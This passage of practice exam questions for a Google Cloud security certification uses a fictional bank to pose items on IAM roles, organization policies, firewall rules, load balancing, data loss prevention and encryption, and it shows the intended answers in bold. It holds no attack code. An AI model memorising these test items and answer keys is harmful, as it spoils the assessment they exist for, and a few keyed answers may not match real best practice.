Python script to allocate users to the groups.</span></p></li><li><p><strong><span>Reset all user permissions in the small bank’s IAM. Use Cloud Identity to create dynamic groups for each of the bank’s teams. Use the dynamic groups’ metadata field for team type to allocate users to their appropriate group with a Python script.</span></strong></p></li><li><p><span>Reset all user permissions in the small bank’s IAM. Use Cloud Identity to create the required Google Groups. Upgrade the Google Groups to Security Groups. Use a Python script to allocate users to the groups.</span></p></li><li><p><span>Leave all user permissions as-is in the small bank’s IAM. Use the Directory API in the Google Workspace Admin SDK to create Google Groups. Use a Python script to allocate users to the Google Groups.</span></p></li></ul><p>&nbsp;</p><ol start='4' ><li><p><span>Cymbal Bank’s organizational hierarchy divides the Organization into departments. The Engineering Department has a ‘product team’ folder. This folder contains folders for each of the bank’s products. One folder titled “analytics” contains a Google Cloud Project that contains an App Engine deployment and a Cloud SQL instance.</span></p></li></ol><ul><li><p><span>Create custom roles for all three user types at the project level. For the team lead, provide all appengine.* and cloudsql.* permissions. For the developer, provide appengine.applications.* and appengine.instances.* permissions. For the code reviewer, provide the appengine.instances.* permissions.</span></p></li><li><p><span>Assign the basic ‘Editor’ role to the team lead. Create a custom role for the developer. Provide all appengine.* permissions to the developer. Provide the predefined ‘App Engine Code Viewer’ role to the code reviewer. Assign all these permissions at the “analytics” folder level.</span></p></li><li><p><strong><span>Assign the basic ‘App Engine Admin’ and ‘Cloud SQL Admin” roles to the team lead. Assign the ‘App Engine Admin’ role to the developer. Assign the ‘App Engine Code Viewer’ role to the code reviewer. Assign all these permissions at the analytics project level.</span></strong></p></li><li><p><span>Create custom roles for all three user types at the “analytics” folder level. For the team lead, provide all appengine.* and cloudsql.* permissions. For the developer, provide appengine.applications.* and appengine.instances.* permissions. For the code reviewer, provide the appengine.instances.* permissions.</span></p><p>&nbsp;</p></li></ul><ol start='5' ><li><p><span>You are an administrator for Cymbal Bank’s Mobile Development Team. You want to control how long different users can access the Google Cloud console, the Cloud SDK, and any applications that require user authorization for Google Cloud scopes without having to reauthenticate. More specifically, you want users with elevated privileges (project owners and billing administrators) to reauthenticate more frequently than regular users at the organization level. What should you do?</span></p></li></ol><ul><li><p><span>Create a custom role for project owners and billing administrators at the organization level in the Google Cloud console. Add the reauthenticationRequired permission to this role. Assign this role to each project owner and billing administrator.</span></p></li><li><p><strong><span>In the Admin console, select Google Cloud session control and set a reauthentication policy that requires reauthentication. Choose the reauthentication frequency from the drop-down list.</span></strong></p></li><li><p><span>Open all Google Cloud projects that belong to Cymbal Bank’s Mobile Development team. Find each project’s Google Cloud session control setting, and configure a reauthentication policy that requires reauthentication. Choose the reauthentication frequency from the drop-down list.</span></p></li><li><p><span>Create a custom role for project owners and billing administrators at the organization level in the Google Cloud console. Add the reauthenticationRequired permission to this role. Create a Google Group that contains all billing administrators and project owners. Apply the custom role to the group.</span></p><p>&nbsp;</p></li></ul><ol start='6' ><li><p><span>Cymbal Bank has a team of developers and administrators working on different sets of Google Cloud resources. The Bank’s administrators should be able to access the serial ports on Compute Engine Instances and create service accounts. Developers should only be able to access serial ports. How would you design the organization hierarchy to provide the required access?</span></p></li></ol><ul><li><p><strong><span>Deny Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: true for constraints/compute.disableSerialPortAccess and enforced: true for constraints/iam.disableServiceAccountCreation. Create a new ‘admin’ folder inside the ‘dev’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.</span></strong></p></li><li><p><span>Deny Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: false for constraints/compute.disableSerialPortAccess. Create a new ‘admin’ folder inside the ‘dev’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.</span></p></li><li><p><span>Deny Serial Port Access and Service Account Creation at the Organization level. Create an ‘admin’ folder and set enforced: false for constraints/compute.disableSerialPortAccess. Create a new ‘dev’ folder inside the ‘admin’ folder, and set enforced: false for constraints/iam.disableServiceAccountCreation. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.</span></p></li><li><p><span>Allow Serial Port Access and Service Account Creation at the organization level. Create a ‘dev’ folder and set enforced: true for constraints/iam.disableServiceAccountCreation. Create another ‘admin’ folder that inherits from the parent inside the organization node. Give developers access to the ‘dev’ folder, and administrators access to the ‘admin’ folder.</span></p><p>&nbsp;</p></li></ul><ol start='7' ><li><p><span>Cymbal Bank has acquired a non-banking financial company (NBFC). This NBFC uses Active Directory as their central directory on an on-premises Windows Server. You have been tasked with migrating all the NBFC users and employee information to Cloud Identity. What should you do?</span></p></li></ol><ul><li><p><strong><span>Use Cloud VPN to connect the on-premises network to your Google Cloud environment. Select an on-premises domain-joined Windows Server. On the domain-joined Windows Server, run Configuration Manager and Google Cloud Directory Sync. Use Cloud VPN’s encrypted channel to transfer users from the on-premises Active Directory to Cloud Identity.</span></strong></p></li><li><p><span>Run Configuration Manager on a Compute Engine instance. Copy the resulting configuration file from this machine onto a new Compute Engine instance to keep the production environment separate from the staging environment. Leave the channel unencrypted because you are in a secure Google Cloud environment. Deploy Google Cloud Directory Sync on this new instance. Connect to the on-premises Windows Server environment from the new instance, and migrate users to Cloud Identity.</span></p></li><li><p><span>Run Microsoft System Center Configuration Manager (SCCM) on a Compute Engine instance. Leave the channel unencrypted because you are in a secure Google Cloud environment. Deploy Google Cloud Directory Sync on the Compute Engine instance. Connect to the on-premises Windows Server environment from the instance, and migrate users to Cloud Identity.</span></p></li><li><p><span>Select an on-premises domain-joined Windows Server. Run Configuration Manager on the domain-joined Windows Server, and copy the resulting configuration file to a Compute Engine instance. Run Google Cloud Directory Sync on the Compute Engine instance over the internet, and use Cloud VPN to sync users from the on-premises Active Directory to Cloud Identity.</span></p><p>&nbsp;</p></li></ul><ol start='8' ><li><p><span>Cymbal Bank’s organizational hierarchy divides the Organization into departments. The Engineering Department has a ‘product team’ folder. This folder contains folders for each of the bank’s products. Each product folder contains one Google Cloud Project, but more may be added. Each project contains an App Engine deployment. Cymbal Bank has hired a new technical product manager and a new web developer. The technical product manager must be able to interact with and manage all services in projects that roll up to the Engineering Department folder. The web developer needs read-only access to App Engine configurations and settings for a specific product. How should you provision the new employees’ roles into your hierarchy following principles of least privilege?</span></p></li></ol><ul><li><p><span>Assign the Project Owner role in each individual project to the technical product manager. Assign the App Engine Deployer role in each individual project to the web developer.</span></p></li><li><p><span>Assign the Project Editor role at the Engineering Department folder level to the technical product manager. Create a Custom Role in the product folder that the web developer needs access to. Add the appengine.versions.create and appengine.versions.delete permissions to that role, and assign it to the web developer.</span></p></li><li><p><strong><span>Assign the Project Editor role at the Engineering Department folder level to the technical product manager. Assign the App Engine Deployer role at the specific product’s folder level to the web developer.</span></strong></p></li><li><p><span>Assign the Project Editor role in each individual project to the technical product manager. Assign the Project Editor role in each individual project to the web developer.</span></p></li></ul><p>&nbsp;</p><ol start='9' ><li><p><span>Cymbal Bank is divided into separate departments. Each department is divided into teams. Each team works on a distinct product that requires Google Cloud resources for development. How would you design a Google Cloud organization hierarchy to best match Cymbal Bank’s organization structure and needs?</span></p></li></ol><ul><li><p><span>Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Product folders. Add Projects to the Product folders.</span></p></li><li><p><span>Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Product folders. Under each Product, create Teams folders. In the Teams folder, add Projects.</span></p></li><li><p><strong><span>Create an Organization node. Under the Organization node, create Department folders. Under each Department, create a Teams folder. Under each Team, create Product folders. Add Projects to the Product folders.</span></strong></p></li><li><p><span>Create an Organization node. Under the Organization node, create Department folders. Under each Department, create Teams folders. Add Projects to the Teams folders.</span></p><p>&nbsp;</p></li></ul><ol start='10' ><li><p><span>Cymbal Bank leverages Google Cloud storage services, an on-premises Apache Spark Cluster, and a web application hosted on a third-party cloud. The Spark cluster and web application require limited access to Cloud Storage buckets and a Cloud SQL instance for only a few hours per day. You have been tasked with sharing credentials while minimizing the risk that the credentials will be compromised. What should you do?</span></p></li></ol><ul><li><p><strong><span>Create a service account with appropriate permissions. Have the Spark Cluster and the web application authenticate as delegated requests, and share the short-lived service account credential as a JWT.</span></strong></p></li><li><p><span>Create a service account with appropriate permissions. Authenticate the Spark Cluster and the web application as direct requests and share the service account key.</span></p></li><li><p><span>Create a service account with appropriate permissions. Authenticate the Spark Cluster and the web application as a delegated request, and share the service account key.</span></p></li><li><p><span>Create a service account with appropriate permissions. Have the Spark Cluster and the web application authenticate as a direct request, and share the short-lived service account credentials as XML tokens.</span></p></li></ul><h3 id='knowledge-check'><span>Knowledge Check</span></h3><p>&nbsp;</p><ol start='' ><li><p><span>Which tool will Cymbal Bank use to synchronize their identities from their on-premise identity management system to Google Cloud?</span></p></li></ol><ul><li><p><span>Service Accounts</span></p></li><li><p><span>Cloud Identity</span></p></li><li><p><span>Active Directory</span></p></li><li><p><strong><span>Google Cloud Directory Sync</span></strong></p><p>&nbsp;</p></li></ul><ol start='2' ><li><p><span>Which feature of Google Cloud will Cymbal Bank use to control the source locations and times that authorized identities will be able to access resources?</span></p></li></ol><ul><li><p><strong><span>IAM Conditions</span></strong></p></li><li><p><span>Identity-aware Proxy</span></p></li><li><p><span>Service Accounts</span></p></li><li><p><span>IAM Roles</span></p></li></ul><p>&nbsp;</p><h2 id='securing-communications-and-establishing-boundary-protection'><span>Securing Communications and Establishing Boundary Protection</span></h2><h3 id='diagnostic-questions-2'><span>Diagnostic questions</span></h3><ol start='' ><li><p><span>Cymbal Bank is releasing a new loan management application using a Compute Engine managed instance group. External users will connect to the application using a domain name or IP address protected with TLS 1.2. A load balancer already hosts this application and preserves the source IP address. You are tasked with setting up the SSL certificate for this load balancer. What should you do?</span></p></li></ol><ul><li><p><span>Create a Google-managed SSL certificate. Attach a global dynamic external IP address to the internal Application Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an HTTPS proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.</span></p></li><li><p><span>Import a self-managed SSL certificate. Attach a global static external IP address to the external proxy Network Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create a TCP proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.</span></p></li><li><p><span>Import a self-managed SSL certificate. Attach a global static external IP address to the external proxy Network Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an SSL proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.</span></p></li><li><p><strong><span>Create a Google-managed SSL certificate. Attach a global static external IP address to the global external Application Load Balancer. Validate that an existing URL map will route the incoming service to your managed instance group backend. Load your certificate and create an HTTPS proxy routing to your URL map. Create a global forwarding rule that routes incoming requests to the proxy.</span></strong></p></li></ul><ol start='2' ><li><p><span>You have recently joined Cymbal Bank as a cloud engineer. You created a custom VPC network, selecting to use the automatic subnet creation mode and nothing else. The default network still exists in your project. You create a new Linux VM instance and select the custom VPC as the network interface. You try to SSH into your instance, but you are getting a “connection failed” error. What answer best explains why you cannot SSH into the instance?</span></p></li></ol><ul><li><p><strong><span>You did not set up any firewall rules on your custom VPC network. While the default VPC comes with a predefined firewall rule that allows SSH traffic, these need to be added to any custom VPCs.</span></strong></p></li><li><p><span>You should have used the default network when setting up your instance. While custom networks support instance creation, they should only be used for internal communication.</span></p></li><li><p><span>You should have deleted the default network. When you have multiple VPCs in your project, Compute Engine can’t allow you to connect because overlapping IP ranges prevent the API from establishing a root connection.</span></p></li><li><p><span>You should have used custom subnet creation mode. Since the default VPC still exists, automatic mode created subnets in the same regions, which led to overlapping IP addresses.</span></p></li></ul><ol start='3' ><li><p><span>Cymbal Bank has published an API that internal teams will use through the Application Load Balancer. You need to limit the API usage to 200 calls every hour. Any exceeding usage should inform the users that servers are busy. Which gcloud command would you run to throttle the load balancing for the given specification?</span></p></li></ol><ul><li><p><span>gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=&quot;&quot; --action=rate-based-ban --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=allow --exceed-action=deny-500 --enforce-on-key=IP</span></p></li><li><p><span>gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=throttle --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=60 --conform-action=deny --exceed-action=deny-404 --enforce-on-key=HTTP-HEADER</span></p></li><li><p><span>gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=rate-based-ban --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=deny --exceed-action=deny-403 --enforce-on-key=HTTP-HEADER</span></p></li><li><p><strong><span>gcloud compute security-policies rules create priority --security-policy sec-policy --src-ip-ranges=source-range --action=throttle --rate-limit-threshold-count=200 --rate-limit-threshold-interval-sec=3600 --conform-action=allow --exceed-action=deny-429 --enforce-on-key=HTTP-HEADER</span></strong></p></li></ul><ol start='4' ><li><p><span>An external audit agency needs to perform a one-time review of Cymbal Bank’s Google Cloud usage. The auditors should be able to access a Default VPC containing BigQuery, Cloud Storage, and Compute Engine instances where all the usage information is stored. You have been tasked with enabling the access from their on-premises environment, which already has a configured VPN. What should you do?</span></p></li></ol><ul><li><p><span>Use Partner Interconnect. Configure an encrypted tunnel in the auditor&#39;s on-premises environment. Use Cloud DNS to create DNS zones and A records for private.googleapis.com.</span></p></li><li><p><strong><span>Use a Cloud VPN tunnel. Use Cloud DNS to create DNS zones and records for *.googleapis.com. Set up on-premises routing with Cloud Router. Use Cloud Router custom route advertisements to announce routes for Google Cloud destinations.</span></strong></p></li><li><p><span>Use a Cloud VPN tunnel. Use your DNS provider to create DNS zones and records for private.googleapis.com. Connect the DNS provider to your on-premises network. Broadcast the request from the on-premises environment. Use a software-defined firewall to manage incoming and outgoing requests.</span></p></li><li><p><span>Use Dedicated Interconnect. Configure a VLAN in the auditor&#39;s on-premises environment. Use Cloud DNS to create DNS zones and records for restricted.googleapis.com and private.googleapis.com. Set up on-premises routing with Cloud Router. Add custom static routes in the VPC to connect individually to BigQuery, Cloud Storage, and Compute Engine instances.</span></p></li></ul><ol start='5' ><li><p><span>Cymbal Bank’s Customer Details API runs on a Compute Engine instance with only an internal IP address. Cymbal Bank’s new branch is co-located outside the Google Cloud points-of-presence (PoPs) and requires a low-latency way for its on-premises apps to consume the API without exposing the requests to the public internet. Which solution would you recommend?</span></p></li></ol><ul><li><p><span>Use Carrier Peering. Use a service provider to access their enterprise grade infrastructure to connect to the Google Cloud environment.</span></p></li><li><p><strong><span>Use Partner Interconnect. Use a service provider to access their enterprise grade infrastructure to connect to the Google Cloud environment.</span></strong></p></li><li><p><span>Use a Content Delivery Network (CDN). Establish direct peering with one of Google’s nearby edge-enabled PoPs.</span></p></li><li><p><span>Use Dedicated Interconnect. Establish direct peering with one of Google’s nearby edge-enabled PoPs.</span></p></li></ul><ol start='6' ><li><p><span>Your organization has a website running on Compute Engine. This instance only has a private IP address. You need to provide SSH access to an on-premises developer who will debug the website from the authorized on-premises location only. How do you enable this?</span></p></li></ol><ul><li><p><span>Use the default VPC’s firewall. Open port 22 for TCP protocol using the Google Cloud Console.</span></p></li><li><p><span>Use SOCKS proxy over SSH. Set up an SSH tunnel to one of the hosts in the network. Create the SOCKS proxy on the client side.</span></p></li><li><p><span>Set up Cloud VPN. Set up an unencrypted tunnel to one of the hosts in the network. Create outbound or egress firewall rules. Use the private IP address to log in using a gcloud ssh command.</span></p></li><li><p><strong><span>Use Identity-Aware Proxy (IAP). Set up IAP TCP forwarding by creating ingress firewall rules on port 22 for TCP using the gcloud command.</span></strong></p></li></ul><ol start='7' ><li><p><span>Cymbal Bank has designed an application to detect credit card fraud that will analyze sensitive information. The application that’s running on a Compute Engine instance is hosted in a new subnet on an existing VPC. Multiple teams who have access to other VMs in the same VPC must access the VM. You want to configure the access so that unauthorized VMs or users from the internet can’t access the fraud detection VM. What should you do?</span></p></li></ol><ul><li><p><span>Use target filtering. Create a tag called ‘app’, and assign the tag to both the source and the target. Create a firewall rule to allow all ingress communication on this tag.</span></p></li><li><p><strong><span>Use subnet isolation. Create a service account for the fraud detection engine. Create service accounts for each of the teams’ Compute Engine instances that will access the engine. Add a firewall rule using: gcloud compute firewall-rules create ACCESS_FRAUD_ENGINE --network</span></strong></p></li><li><p><span>Use target filtering. Create two tags called ‘app’ and ‘data’. Assign the ‘app’ tag to the Compute Engine instance hosting the Fraud Detection App (source), and assign the ‘data’ tag to the other Compute Engine instances (target). Create a firewall rule to allow all ingress communication on this tag.</span></p></li><li><p><span>Use subnet isolation. Create a service account for the fraud detection VM. Create one service account for all the teams’ Compute Engine instances that will access the fraud detection VM. Create a new firewall rule using:gcloud compute firewall-rules create ACCESS_FRAUD_ENGINE --network</span></p></li></ul><ol start='8' ><li><p><span>Cymbal Bank needs to connect its employee MongoDB database to a new human resources web application on the same network. Both the database and the application are autoscaled with the help of Instance templates. As the Security Administrator and Project Editor, you have been tasked with allowing the application to read port 27017 on the database. What should you do?</span></p></li></ol><ul><li><p><strong><span>Create service accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow TCP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-service-account</span></strong></p></li><li><p><span>Create a user account for the database admin and a service account for the application. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow TCP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-admin-user-account</span></p></li><li><p><span>Create user accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --deny UDP:27017 --source-service-accounts web-application-user-account --target-service-accounts database-admin-user-account</span></p></li><li><p><span>Create service accounts for the application and database. Create a firewall rule using:gcloud compute firewall-rules create ALLOW_MONGO_DB --network network-name --allow ICMP:27017 --source-service-accounts web-application-service-account --target-service-accounts database-service-account</span></p></li></ul><ol start='9' ><li><p><span>The data from Cymbal Bank’s loan applicants resides in a shared VPC. A credit analysis team uses a CRM tool hosted in the App Engine standard environment. You need to provide credit analysts with access to this data. You want the charges to be incurred by the credit analysis team. What should you do?</span></p></li></ol><ul><li><p><span>Add egress firewall rules to allow SSH and/or RDP ports for the App Engine standard environment in the Shared VPC network. Create a client-side connector in the Service Project using the IP range of the target VPC. Verify that the connector is in a READY state. Create an egress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.</span></p></li><li><p><span>Add ingress firewall rules to allow NAT and Health Check ranges for App Engine standard environment in the Shared VPC network. Create a server-side connector in the Host Project using the Shared VPC Project ID. Verify that the connector is in a READY state. Create an ingress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.</span></p></li><li><p><span>Add egress firewall rules to allow TCP and UDP ports for the App Engine standard environment in the Shared VPC network. Create either a client-side connector in the Service Project or a server-side connector in the Host Project using the IP Range or Project ID of the target VPC. Verify that the connector is in a READY state. Create an egress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.</span></p></li><li><p><strong><span>Add ingress firewall rules to allow NAT and Health Check ranges for the App Engine standard environment in the Shared VPC network. Create a client-side connector in the Service Project using the Shared VPC Project ID. Verify that the connector is in a READY state. Create an ingress rule on the Shared VPC network to allow the connector using Network Tags or IP ranges.</span></strong></p></li></ul><ol start='10' ><li><p><span>An ecommerce portal uses Google Kubernetes Engine to deploy its recommendation engine in Docker containers. This cluster instance does not have an external IP address. You need to provide internet access to the pods in the Kubernetes cluster. What configuration would you add?</span></p></li></ol><ul><li><p><strong><span>Cloud NAT gateway, subnet primary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster</span></strong></p></li><li><p><span>Cloud DNS, subnet primary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster</span></p></li><li><p><span>Nginx load balancer, subnet secondary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster</span></p></li><li><p><span>Cloud VPN, subnet secondary IP address range for nodes, and subnet secondary IP address range for pods and services in the cluster</span></p></li></ul><p>&nbsp;</p><h3 id='knowledge-check-2'><span>Knowledge Check</span></h3><ol start='' ><li><p><span>Which tool will Cymbal Bank use to enforce authentication and authorization for services deployed to Google Cloud?</span></p></li></ol><ul><li><p><span>Firewall rules</span></p></li><li><p><span>Google Cloud Armor</span></p></li><li><p><strong><span>Identity-Aware proxy</span></strong></p></li><li><p><span>Application Load Balancer</span></p></li></ul><ol start='2' ><li><p><span>How will Cymbal Bank enable resources with only internal IP addresses to make requests to the Internet?</span></p></li></ol><ul><li><p><span>Google private access</span></p></li><li><p><span>Dedicated Interconnect</span></p></li><li><p><strong><span>Cloud NAT</span></strong></p></li><li><p><span>Shared VPC</span></p></li></ul><p>&nbsp;</p><h2 id='ensuring-data-protection'><span>Ensuring Data Protection</span></h2><h3 id='diagnostic-questions-3'><span>Diagnostic questions</span></h3><ol start='' ><li><p><span>Cymbal Bank has hired a data analyst team to analyze scanned copies of loan applications. Because this is an external team, Cymbal Bank does not want to share the name, gender, phone number, or credit card numbers listed in the scanned copies. You have been tasked with hiding this PII information while minimizing latency. What should you do?</span></p></li></ol><ul><li><p><strong><span>Use the Cloud Data Loss Prevention (DLP) API to make redact image requests. Provide your project ID, built-in infoTypes, and the scanned copies when you make the requests.</span></strong></p></li><li><p><span>Use the Cloud Vision API to perform optical code recognition (OCR) from scanned images. Redact the text using the Cloud Data Loss Prevention (DLP) API with regular expressions.</span></p></li><li><p><span>Use the Cloud Vision API to perform text extraction from scanned images. Redact the text using the Cloud Natural Language API with regular expressions.</span></p></li><li><p><span>Use the Cloud Vision API to perform optical code recognition (OCR) from scanned images. Redact the text using the Cloud Natural Language API with regular expressions.</span></p></li></ul><ol start='2' ><li><p><span>Cymbal Bank uses Google Kubernetes Engine (GKE) to deploy its Docker containers. You want to encrypt the boot disk for a cluster running a custom image so that the key rotation is controlled by the Bank. GKE clusters will also generate up to 1024 randomized characters that will be used with the keys with Docker containers. What steps would you take to apply the encryption settings with a dedicated hardware security layer?</span></p></li></ol><ul><li><p><span>Create a new key ring using Cloud Key Management Service. Extract this key to a certificate. Use the Google Cloud Console to update the Kubernetes configuration. Validate using MAC digital signatures, and use a startup script to generate random bytes.</span></p></li><li><p><span>Create a new key ring using Cloud Key Management Service. Extract this key to a certificate. Use the kubectl command to update the Kubernetes configuration. Validate using MAC digital signatures, and use a startup script to generate random bytes.</span></p></li><li><p><strong><span>Create a new GKE cluster with customer-managed encryption and HSM enabled. Deploy the containers to this cluster. Delete the old GKE cluster. Use Cloud HSM to generate random bytes and provide an additional layer of security.</span></strong></p></li><li><p><span>In the Google Cloud console, navigate to Google Kubernetes Engine. Select your cluster and the boot node inside the cluster. Enable customer-managed encryption. Use Cloud HSM to generate random bytes and provide an additional layer of security.</span></p></li></ul><ol start='3' ><li><p><span>Cymbal Bank stores customer information in a BigQuery table called ‘Information,’ which belongs to the dataset ‘Customers.’ Various departments of Cymbal Bank, including loan, credit card, and trading, access the information table. Although the data source remains the same, each department needs to read and analyze separate customers and customer-attributes. You want a cost-effective way to configure departmental access to BigQuery to provide optimal performance. What should you do?</span></p></li></ol><ul><li><p><span>Create separate datasets for each department. Create authorized functions in each dataset to perform required aggregations. Write transformed data to new tables for each department separately. Provide the bigquery.dataViewer role to each department’s required users.</span></p></li><li><p><span>Create an authorized dataset in BigQuery’s Explorer panel. Write Customers’ table metadata into a JSON file, and edit the file to add each department’s Project ID and Dataset ID. Provide the bigquery.user role to each department’s required users.</span></p></li><li><p><span>Secure data with classification. Open the Data Catalog Taxonomies page in the Google Cloud Console. Create policy tags for required columns and rows. Provide the bigquery.user role to each department’s required users. Provide policy tags access to each department separately.</span></p></li><li><p><strong><span>Create separate datasets for each department. Create views for each dataset separately. Authorize these views to access the source dataset. Share the datasets with departments. Provide the bigquery.dataViewer role to each department’s required users.</span></strong></p></li></ul><ol start='4' ><li><p><span>Cymbal Bank calculates employee incentives on a monthly basis for the sales department and on a quarterly basis for the marketing department. The incentives are released with the next month’s salary. Employee’s performance documents are stored as spreadsheets, which are retained for at least one year for audit. You want to configure the most cost-effective storage for this scenario. What should you do?</span></p></li></ol><ul><li><p><span>Import the spreadsheets into Cloud Storage and create NoSQL tables. Use App Engine cron jobs to run monthly for Sales and quarterly for Marketing. Use a separate job to delete the data after 1 year.</span></p></li><li><p><strong><span>Upload the spreadsheets to Cloud Storage. Select the Nearline storage class for the sales department and Coldline storage for the marketing department. Use object lifecycle management rules to set the storage class to Archival after 365 days. Process the data on BigQuery using jobs that run monthly for Sales and quarterly for Marketing.</span></strong></p></li><li><p><span>Import the spreadsheets to Cloud SQL, and create separate tables for Sales and Marketing. For Table Expiration, set 365 days for both tables. Use stored procedures to calculate incentives. Use App Engine cron jobs to run stored procedures monthly for Sales and quarterly for Marketing.</span></p></li><li><p><span>Import the spreadsheets to BigQuery, and create separate tables for Sales and Marketing. Set table expiry rules to 365 days for both tables. Create jobs scheduled to run every quarter for Marketing and every month for Sales.</span></p></li></ul><ol start='5' ><li><p><span>Cymbal Bank has a Cloud SQL instance that must be shared with an external agency. The agency’s developers will be assigned roles and permissions through a Google Group in Identity and Access Management (IAM). The external agency is on an annual contract and will require a connection string, username, and password to connect to the database. How would you configure the group’s access?</span></p></li></ol><ul><li><p><strong><span>Use Secret Manager. Use the duration attribute to set the expiry period to one year. Add the secretmanager.secretAccessor role for the group that contains external developers.</span></strong></p></li><li><p><span>Use Secret Manager. Use the resource attribute to set a key-value pair with key as duration and values as expiry period one year from now. Add secretmanager.viewer role for the group that contains external developers.</span></p></li><li><p><span>Use Secret Manager for the connection string and username, and use Cloud Key Management Service for the password. Use tags to set the expiry period to the timestamp one year from now. Add secretmanager.secretVersionManager and secretmanager.secretAccessor roles for the group that contains external developers.</span></p></li><li><p><span>Use Cloud Key Management Service. Use the destination IP address and Port attributes to provide access for developers at the external agency. Remove the IAM access after one year and rotate the shared keys. Add cloudkms.cryptoKeyEncryptorDecryptor role for the group that contains the external developers.</span></p></li></ul><ol start='6' ><li><p><span>Cymbal Bank needs to migrate existing loan processing applications to Google Cloud. These applications transform confidential financial information. All the data should be encrypted at all stages, including sharing between sockets and RAM. An integrity test should also be performed every time these instances boot. You need to use Cymbal Bank’s encryption keys to configure the Compute Engine instances. What should you do?</span></p></li></ol><ul><li><p><strong><span>Create a Confidential VM instance with Customer-Supplied Encryption Keys. In Cloud Logging, collect all logs for sevLaunchAttestationReportEvent.</span></strong></p></li><li><p><span>Create a Confidential VM instance with Customer-Managed Encryption Keys. In Cloud Logging, collect all logs for earlyBootReportEvent.</span></p></li><li><p><span>Create a Shielded VM instance with Customer-Managed Encryption Keys. In Cloud Logging, collect all logs for sevLaunchAttestationReportEvent.</span></p></li><li><p><span>Create a Shielded VM instance with Customer-Supplied Encryption Keys. In Cloud Logging, collect all logs for earlyBootReportEvent.</span></p></li></ul><ol start='7' ><li><p><span>Cymbal Bank needs to statistically predict the days customers delay the payments for loan repayments and credit card repayments. Cymbal Bank does not want to share the exact dates a customer has defaulted or made a payment with data analysts. Additionally, you need to hide the customer name and the customer type, which could be corporate or retail. How do you provide the appropriate information to the data analysts?</span></p></li></ol><ul><li><p><span>Generalize all dates to year and month with bucketing. Use the built-in infoType for customer name. Use a custom infoType for customer type with a custom dictionary.</span></p></li><li><p><strong><span>Generalize all dates to year and month with date shifting. Use a predefined infoType for customer name. Use a custom infoType for customer type with a custom dictionary.</span></strong></p></li><li><p><span>Generalize all dates to year and month with date shifting. Use a predefined infoType for customer name. Use a custom infoType for customer type with regular expression.</span></p></li><li><p><span>Generalize all dates to year and month with bucketing. Use the built-in infoType for customer name. Use a custom infoType for customer type with regular expression.</span></p></li></ul><ol start='8' ><li><p><span>You are tasked with developing an AI system on Google Cloud for a telecommunications business. This AI system will conduct sentiment analysis on conversations agents have with customers, and provide conversational recommendations to improve customer satisfaction in the future. What AI/ML-specific security controls do you need to plan for when developing this system?</span></p></li></ol><ul><li><p><strong><span>AI systems are more interconnected than non-AI systems. Prepare for new attack vectors, as attackers can exploit vulnerabilities in one system to attack another.</span></strong></p></li><li><p><span>Leverage an AI model-specific threat detection scanner. Threats between AI systems and non-AI systems have very little in common.</span></p></li><li><p><span>Deploy your AI solution using managed instance groups (MIGs). These have baked in security controls specific to running AI workloads.</span></p></li><li><p><span>Select Google Cloud AI services that leverage a PaaS model. These are the only ones that can guarantee a secure-by-design foundation.</span></p></li></ul><ol start='9' ><li><p><span>You&#39;re building a machine learning model on Google Cloud. You&#39;re choosing between two options: managing the infrastructure yourself (IaaS) or using Google&#39;s managed services (PaaS). To ensure the best security posture for both the model and its data, which TWO factors should you prioritize when defining security requirements for each hosting option?</span></p></li></ol><ul><li><p><strong><span>Granular access controls and permissions</span></strong></p></li><li><p><span>Compliance with internal security policies</span></p></li><li><p><strong><span>Data location and residency restrictions</span></strong></p></li><li><p><span>Network traffic inspection and intrusion detection</span></p></li><li><p><span>Physical server hardening and security patches</span></p></li></ul><ol start='10' ><li><p><span>You are building an AI model on Google Cloud to analyze customer data and predict purchase behavior. This model will have access to sensitive information like purchase history and demographics. To protect this data and prevent misuse of the model, what THREE security controls are most important to implement?</span></p></li></ol><ul><li><p><span>Store all model training data in BigQuery with public access for transparency.</span></p></li><li><p><span>Configure IAM roles to grant full access to the model for all Google Cloud users.</span></p></li><li><p><strong><span>Monitor the model&#39;s performance for anomalies and biases, then manually intervene if needed.</span></strong></p></li><li><p><strong><span>Enable Google Cloud Armor on your deployed model to block malicious requests.</span></strong></p></li><li><p><strong><span>Deploy the model in a region with the highest data security standards.</span></strong></p></li></ul><p>&nbsp;</p><h3 id='knowledge-check-3'><span>Knowledge Check</span></h3><ol start='' ><li><p><span>What feature will allow Cymbal Bank to delete or change the storage class of objects in Cloud Storage buckets?                  